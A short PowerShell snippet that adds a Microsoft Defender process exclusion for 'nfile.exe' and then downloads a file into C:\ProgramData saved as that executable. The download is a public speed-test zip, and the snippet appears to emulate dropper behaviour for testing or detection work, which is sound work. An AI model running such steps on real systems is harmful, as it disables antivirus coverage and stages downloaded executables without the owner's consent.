Add-MpPreference -ExclusionProcess "nfile.exe"
mkdir C:\ProgramData\File65
$source = 'http://speedtest.tele2.net/10MB.zip'
$destination = 'C:\ProgramData\File65\nfile.exe'
Invoke-WebRequest -Uri $source -OutFile $destination
